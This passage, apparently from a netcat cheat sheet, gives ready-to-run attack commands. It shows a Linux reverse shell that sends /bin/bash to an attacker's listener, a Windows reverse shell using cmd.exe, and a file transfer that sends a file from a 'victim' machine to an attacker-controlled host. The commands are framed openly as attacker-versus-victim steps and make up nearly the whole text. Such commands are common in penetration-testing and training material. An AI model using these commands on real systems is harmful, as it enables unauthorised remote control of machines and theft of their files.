3. Reverse Shell (Victim to Attacker):
On the attacker's machine (listening): nc -lvp 4444
On the victim machine: nc <attacker_ip> 4444 -e /bin/bash

4. File Transfer (Sending Files to the Victim):
On the attacker’s machine (to listen for the incoming file): nc -lvp 4444 > received_file.txt
On the victim machine (to send a file): nc <attacker_ip> 4444 < file_to_send.txt

On the target machine (Windows): nc <attacker_ip> <port> -e cmd.exe
